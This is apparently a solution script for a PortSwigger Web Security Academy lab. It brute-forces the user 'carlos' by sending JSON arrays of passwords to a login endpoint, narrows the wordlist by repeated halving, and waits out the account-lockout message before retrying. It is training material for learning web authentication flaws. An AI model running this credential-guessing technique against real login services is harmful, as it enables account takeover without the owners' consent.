# A simple python program made to solve the following PortSwigger Lab:
# https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request

# Inspecting the form element reveals a JavaScript file named login.js
# On submission the form elements are turned into a JSON object
# This can also be verified by intercepting the request where we can see the following:
#
# {
#  "username": "carlos",
#  "password": "testing"
# }
#
# Modifying the password parameters value to contain an array of passwords goes through without error.
#
# {
#  "username": "carlos",
#  "password": ["testing1", "testing2"]
# }
#
# Sending an array containing all passwords from the given wordlist results in a 302 status code and a successfull login.
# The program below takes it a step further by repeatedly cutting the wordlist in half to find the password for Carlos

# Basic logic used in program:
# Check if password exists in passwords file by sending an initial HTTP POST request with every single password in an array.
# If the 302 status code is returned, the password is in the file.
# Split the password file in half.
# Send one POST request for each half.
# Keep the half of passwords that resulted in a 302 status code.
# Split that half repeatedly until only a single password is kept.
# Every HTTP POST request should be checked for the account lockout message.
# If the account lockout message is present, sleep for 60 seconds and resend the request.

import sys
import time
import requests

SCHEME = "HTTPS://"
URL = "web-security-academy.net"
PATH = "/login"
SUB_DOMAIN = "0a7200c103864caf80328657000d003b" # Change This Line With Labs Subdomain
FULL_PATH = SCHEME + SUB_DOMAIN + "." + URL + PATH
PASSWORD_FILE = "../../Word-Lists/password-wordlist.txt"
USERNAME = "carlos"
SUCCESSFULL_STATUS = 302
ERROR_MESSAGE = "You have made too many incorrect login attempts. Please try again in 1 minute(s)."

def load_file_lines(file_name):
    try:
        print(f"Loading {file_name}...")
        array = []
        with open(file_name, 'r') as file:
            for line in file:
                array.append(line.strip())
        return array
    except FileNotFoundError:
        print(f"Error: File '{file_name}' not found.")
    return None

def create_payload(passwords):
    payload_values = []
    for password in passwords:
        payload_values.append(password)
    return {"username": USERNAME, "password": payload_values}

def send_post_request(payload):
    RESPONSE = requests.post(FULL_PATH, json = payload, allow_redirects = False)
    return RESPONSE

def is_password_in_file(passwords):
    PAYLOAD = create_payload(passwords)
    response = send_post_request(PAYLOAD)
    if ERROR_MESSAGE in response.text:
        print(f"Received error message: {ERROR_MESSAGE}")
        print(f"Sleeping for 60 seconds and resending request...")
        time.sleep(60)
        response = send_post_request(PAYLOAD)
    if response.status_code == SUCCESSFULL_STATUS:
        return True
    return False

def split_password_list(passwords):
    HALFWAY = len(passwords) // 2
    FIRST_HALF = passwords[:HALFWAY]
    SECOND_HALF = passwords[HALFWAY:]
    return FIRST_HALF, SECOND_HALF

def find_password(passwords):
    EXISTS = is_password_in_file(passwords)
    if EXISTS:
        print(f"Password was found within payload...")
        password_list = passwords
        while len(password_list) != 1:
            password_list_1, password_list_2 = split_password_list(password_list)
            if is_password_in_file(password_list_1):
                password_list = password_list_1
            elif is_password_in_file(password_list_2):
                password_list = password_list_2
            else:
                return None
            print(f"Password found within new password list: {password_list}")
        PASSWORD = password_list[0]
        return PASSWORD
    return None

def main():
    print(f"Program Starting... Target URL: {FULL_PATH}")
    PASSWORDS = load_file_lines(PASSWORD_FILE)
    if PASSWORDS is None:
        print(f"Something went wrong trying to load file: {PASSWORD_FILE}")
        sys.exit(1)
    PASSWORD = find_password(PASSWORDS)
    if PASSWORD is None:
        print(f"Could Not Find Password...")
        sys.exit(1)
    print(f"Possible credentials found... {USERNAME}:{PASSWORD}")
    return 0

if __name__ == "__main__":
    main()
